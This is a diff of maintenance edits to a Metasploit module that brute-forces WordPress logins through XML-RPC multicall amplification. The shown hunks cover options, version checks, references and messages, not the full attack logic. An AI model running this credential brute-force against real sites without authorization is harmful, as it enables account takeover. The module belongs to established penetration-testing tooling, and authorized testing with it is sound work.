@@ -1,14 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'metasploit/framework/credential_collection'
 require 'metasploit/framework/login_scanner/wordpress_multicall'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::AuthBrute
@@ -32,7 +30,7 @@ class MetasploitModule < Msf::Auxiliary
       'References'  =>
         [
           ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/' ],
-          ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html' ]
+          ['URL', 'http://web.archive.org/web/20250220003829/https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html' ]
         ],
       'DefaultOptions' =>
         {
@@ -45,12 +43,12 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptInt.new('BLOCKEDWAIT', [ true, 'Time(minutes) to wait if got blocked', 6 ]),
         OptInt.new('CHUNKSIZE',   [ true, 'Number of passwords need to be sent per request. (1700 is the max)', 1500 ]),
-      ], self.class)
+      ])
 
     # Not supporting these options, because we are not actually letting the API to process the
     # password list for us. We are doing that in Metasploit::Framework::LoginScanner::WordpressRPC.
     deregister_options(
-      'BLANK_PASSWORDS', 'PASSWORD', 'USERPASS_FILE', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_PASS'
+      'BLANK_PASSWORDS', 'PASSWORD', 'USERPASS_FILE', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_SKIP_EXISTING'
       )
   end
 
@@ -70,7 +68,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def check_setup
     version = wordpress_version
-    vprint_status("Found Wordpress version: #{version}")
+    vprint_good("Found Wordpress version: #{version}")
 
     if !wordpress_and_online?
       print_error("#{peer}:#{rport}#{target_uri} does not appear to be running Wordpress or you got blocked! (Do Manual Check)")
@@ -78,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
     elsif !wordpress_xmlrpc_enabled?
       print_error("#{peer}:#{rport}#{wordpress_url_xmlrpc} does not enable XMLRPC")
       false
-    elsif Gem::Version.new(version) >= Gem::Version.new('4.4.1')
+    elsif Rex::Version.new(version) >= Rex::Version.new('4.4.1')
       print_error("#{peer}#{wordpress_url_xmlrpc} Target's version (#{version}) is not vulnerable to this attack.")
       vprint_status("Dropping CHUNKSIZE from #{datastore['CHUNKSIZE']} to 1")
       datastore['CHUNKSIZE'] = 1
@@ -93,7 +91,7 @@ class MetasploitModule < Msf::Auxiliary
     if check_setup
       print_status("XMLRPC enabled, Hello message received!")
     else
-      print_error("Abborting the attack.")
+      print_error("Aborting the attack.")
       return
     end
 
@@ -135,5 +133,4 @@ class MetasploitModule < Msf::Auxiliary
     end
 
   end
-
 end
